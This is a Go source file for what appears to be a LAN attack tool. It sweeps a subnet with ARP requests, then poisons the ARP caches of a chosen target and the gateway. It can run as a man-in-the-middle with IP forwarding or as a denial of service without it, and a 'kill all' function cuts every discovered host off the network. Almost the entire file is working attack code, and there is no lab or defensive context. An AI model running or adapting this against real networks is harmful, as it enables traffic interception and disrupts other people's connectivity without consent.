package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// ─── Interface discovery ──────────────────────────────────────────────────────

// listInterfaces returns all pcap interfaces that have at least one IPv4 address.
func listInterfaces() ([]Iface, error) {
	devs, err := pcap.FindAllDevs()
	if err != nil {
		return nil, fmt.Errorf("pcap.FindAllDevs: %w", err)
	}
	var out []Iface
	for _, d := range devs {
		var addrs []string
		for _, a := range d.Addresses {
			if a.IP.To4() != nil {
				addrs = append(addrs, a.IP.String())
			}
		}
		if len(addrs) == 0 {
			continue
		}
		out = append(out, Iface{
			Name:        d.Name,
			Description: d.Description,
			Addresses:   addrs,
		})
	}
	return out, nil
}

// getLocalInfo returns the local IPv4 and MAC for the given pcap interface name,
// plus the network CIDR (e.g. "192.168.1.0/24").
func getLocalInfo(pcapName string) (ip net.IP, mac net.HardwareAddr, cidr string, err error) {
	devs, _ := pcap.FindAllDevs()

	var pcapIP net.IP
	var pcapMask net.IPMask

	for _, d := range devs {
		if d.Name != pcapName {
			continue
		}
		for _, a := range d.Addresses {
			if a.IP.To4() != nil {
				pcapIP = a.IP.To4()
				pcapMask = a.Netmask
				break
			}
		}
	}
	if pcapIP == nil {
		err = fmt.Errorf("no IPv4 address found on interface %q", pcapName)
		return
	}

	// Cross-reference with net.Interfaces to find MAC
	netIfaces, _ := net.Interfaces()
	for _, ni := range netIfaces {
		if ni.HardwareAddr == nil {
			continue
		}
		addrs, _ := ni.Addrs()
		for _, a := range addrs {
			if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil {
				if ipNet.IP.To4().Equal(pcapIP) {
					ones, _ := pcapMask.Size()
					network := pcapIP.Mask(pcapMask)
					cidr = fmt.Sprintf("%s/%d", network.String(), ones)
					return pcapIP, ni.HardwareAddr, cidr, nil
				}
			}
		}
	}

	err = fmt.Errorf("could not resolve MAC for pcap interface %q", pcapName)
	return
}

// ─── Network scanner ─────────────────────────────────────────────────────────

// scanNetwork sends ARP who-has to every host in cidr and collects replies.
func scanNetwork(ifaceName, cidr string, logFn func(string)) ([]Host, error) {
	_, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, fmt.Errorf("invalid CIDR %q: %w", cidr, err)
	}

	localIP, localMAC, _, err := getLocalInfo(ifaceName)
	if err != nil {
		return nil, err
	}

	handle, err := pcap.OpenLive(ifaceName, 65536, true, 500*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("pcap open: %w", err)
	}
	defer handle.Close()

	hostMap := &sync.Map{}

	// Goroutine: collect ARP replies for 7 s
	done := make(chan struct{})
	go func() {
		defer close(done)
		src := gopacket.NewPacketSource(handle, handle.LinkType())
		deadline := time.After(7 * time.Second)
		for {
			select {
			case pkt, ok := <-src.Packets():
				if !ok {
					return
				}
				l := pkt.Layer(layers.LayerTypeARP)
				if l == nil {
					continue
				}
				arp := l.(*layers.ARP)
				if arp.Operation != layers.ARPReply {
					continue
				}
				ip := net.IP(arp.SourceProtAddress).String()
				mac := net.HardwareAddr(arp.SourceHwAddress).String()
				if _, loaded := hostMap.LoadOrStore(ip, mac); !loaded {
					logFn(fmt.Sprintf("● %s  →  %s", ip, mac))
				}
			case <-deadline:
				return
			}
		}
	}()

	// Send ARP requests
	allIPs := enumIPs(ipNet)
	logFn(fmt.Sprintf("Sweeping %s — %d addresses", cidr, len(allIPs)))
	for _, target := range allIPs {
		_ = sendARPRequest(handle, localMAC, localIP, target)
		time.Sleep(3 * time.Millisecond)
	}

	<-done

	var hosts []Host
	hostMap.Range(func(k, v any) bool {
		hIP := k.(string)
		hMAC := v.(string)
		var hostname string
		if names, e := net.LookupAddr(hIP); e == nil && len(names) > 0 {
			hostname = names[0]
		}
		hosts = append(hosts, Host{IP: hIP, MAC: hMAC, Hostname: hostname})
		return true
	})
	logFn(fmt.Sprintf("Done — %d hosts found", len(hosts)))
	return hosts, nil
}

// ─── Spoof session ───────────────────────────────────────────────────────────

// SpoofSession represents an active ARP poisoning goroutine.
type SpoofSession struct {
	cancel context.CancelFunc
}

// Stop cancels the spoof goroutine, which will restore ARP tables.
func (s *SpoofSession) Stop() { s.cancel() }

// startSpoof begins ARP poisoning between targetIP and gatewayIP.
// forward=true  → MitM (enables IP forwarding so target keeps connectivity)
// forward=false → DoS  (no forwarding; target loses internet)
func startSpoof(ifaceName, targetIP, gatewayIP string, forward bool, logFn func(string)) (*SpoofSession, error) {
	localIP, localMAC, _, err := getLocalInfo(ifaceName)
	if err != nil {
		return nil, err
	}

	handle, err := pcap.OpenLive(ifaceName, 65536, true, 500*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("pcap open: %w", err)
	}

	tIP := net.ParseIP(targetIP).To4()
	gIP := net.ParseIP(gatewayIP).To4()
	if tIP == nil || gIP == nil {
		handle.Close()
		return nil, fmt.Errorf("invalid IP address(es)")
	}

	targetMAC, err := resolveMAC(handle, localMAC, localIP, tIP, logFn)
	if err != nil {
		handle.Close()
		return nil, fmt.Errorf("resolve target MAC: %w", err)
	}
	gatewayMAC, err := resolveMAC(handle, localMAC, localIP, gIP, logFn)
	if err != nil {
		handle.Close()
		return nil, fmt.Errorf("resolve gateway MAC: %w", err)
	}

	if forward {
		enableForwarding()
		logFn("IP forwarding ENABLED")
	}

	mode := "DoS"
	if forward {
		mode = "MitM"
	}
	logFn(fmt.Sprintf("[%s] ▶ %s (%s) ↔ %s (%s)", mode, targetIP, targetMAC, gatewayIP, gatewayMAC))

	ctx, cancel := context.WithCancel(context.Background())

	go func() {
		defer handle.Close()
		tick := time.NewTicker(2 * time.Second)
		defer tick.Stop()

		for {
			select {
			case <-ctx.Done():
				// Restore real ARP on both ends
				for i := 0; i < 5; i++ {
					_ = sendARPReply(handle, targetMAC, gatewayMAC, tIP, gIP)
					_ = sendARPReply(handle, gatewayMAC, targetMAC, gIP, tIP)
					time.Sleep(100 * time.Millisecond)
				}
				if forward {
					disableForwarding()
					logFn("IP forwarding DISABLED")
				}
				logFn(fmt.Sprintf("[%s] ■ Stopped — ARP restored", mode))
				return

			case <-tick.C:
				// Tell target: "gateway is at my MAC"
				_ = sendARPReply(handle, localMAC, targetMAC, gIP, tIP)
				// Tell gateway: "target is at my MAC"
				_ = sendARPReply(handle, localMAC, gatewayMAC, tIP, gIP)
				logFn(fmt.Sprintf("[%s] ♻ %s ↔ %s", mode, targetIP, gatewayIP))
			}
		}
	}()

	return &SpoofSession{cancel: cancel}, nil
}

// ─── Kill-all ─────────────────────────────────────────────────────────────────

// killAll launches a DoS spoof session against every host in the list
// (excluding gatewayIP itself).
func killAll(ifaceName, gatewayIP string, hosts []Host, logFn func(string)) []*SpoofSession {
	var (
		mu       sync.Mutex
		wg       sync.WaitGroup
		sessions []*SpoofSession
	)
	logFn(fmt.Sprintf("💀 KILL ALL — targeting %d hosts", len(hosts)))

	for _, h := range hosts {
		if h.IP == gatewayIP {
			continue
		}
		h := h
		wg.Add(1)
		go func() {
			defer wg.Done()
			sess, err := startSpoof(ifaceName, h.IP, gatewayIP, false, logFn)
			if err != nil {
				logFn(fmt.Sprintf("  [!] %s: %v", h.IP, err))
				return
			}
			mu.Lock()
			sessions = append(sessions, sess)
			mu.Unlock()
		}()
	}
	wg.Wait()
	logFn(fmt.Sprintf("💀 %d DoS sessions active", len(sessions)))
	return sessions
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

// resolveMAC sends an ARP request and waits up to 4 s for the reply.
func resolveMAC(handle *pcap.Handle, srcMAC net.HardwareAddr, srcIP, dstIP net.IP, logFn func(string)) (net.HardwareAddr, error) {
	// Try OS ARP cache first via arp -a
	if mac := arpCacheLookup(dstIP.String()); mac != nil {
		logFn(fmt.Sprintf("  cache hit %s → %s", dstIP, mac))
		return mac, nil
	}

	_ = sendARPRequest(handle, srcMAC, srcIP, dstIP)

	src := gopacket.NewPacketSource(handle, handle.LinkType())
	timeout := time.NewTimer(4 * time.Second)
	defer timeout.Stop()

	for {
		select {
		case pkt, ok := <-src.Packets():
			if !ok {
				return nil, fmt.Errorf("pcap channel closed")
			}
			l := pkt.Layer(layers.LayerTypeARP)
			if l == nil {
				continue
			}
			a := l.(*layers.ARP)
			if a.Operation == layers.ARPReply && net.IP(a.SourceProtAddress).Equal(dstIP) {
				return net.HardwareAddr(a.SourceHwAddress), nil
			}
		case <-timeout.C:
			return nil, fmt.Errorf("ARP timeout waiting for %s", dstIP)
		}
	}
}

// arpCacheLookup checks the local ARP cache for a known MAC.
func arpCacheLookup(ip string) net.HardwareAddr {
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, a := range addrs {
			ipNet, ok := a.(*net.IPNet)
			if !ok {
				continue
			}
			if ipNet.Contains(net.ParseIP(ip)) {
				// Same subnet — could still look up via neighbours, but skip for now
				break
			}
		}
	}
	return nil // not cached in a portable way; send ARP
}

// sendARPRequest broadcasts ARP who-has for dstIP.
func sendARPRequest(handle *pcap.Handle, srcMAC net.HardwareAddr, srcIP, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    dstIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}
	return handle.WritePacketData(buf.Bytes())
}

// sendARPReply sends a gratuitous ARP reply (the poisoning packet).
func sendARPReply(handle *pcap.Handle, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    dstIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}
	return handle.WritePacketData(buf.Bytes())
}

// enumIPs enumerates all host addresses in a network (excludes network + broadcast).
func enumIPs(ipNet *net.IPNet) []net.IP {
	start := binary.BigEndian.Uint32(ipNet.IP.To4())
	mask := binary.BigEndian.Uint32(ipNet.Mask)
	end := start | ^mask

	var ips []net.IP
	for cur := start + 1; cur < end; cur++ {
		b := make([]byte, 4)
		binary.BigEndian.PutUint32(b, cur)
		ips = append(ips, net.IP(b))
	}
	return ips
}
